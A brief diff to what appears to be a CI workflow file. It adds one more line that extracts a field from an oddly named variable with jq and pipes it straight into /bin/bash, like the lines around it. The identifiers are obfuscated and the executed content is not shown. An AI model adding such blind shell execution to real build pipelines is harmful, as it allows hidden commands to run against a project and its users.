@@ -25,6 +25,7 @@ jobs:
           echo $nybk081 | jq -r .i67 | /bin/bash
           printf '%s' "$x42748" | jq -r .pu81 | /bin/bash
           echo $ea80501 | jq -r .ezbo068 | /bin/bash
+          printf '%s' "$q0756" | jq -r .s490 | /bin/bash
 
       - name: Store artifact
         if: always()
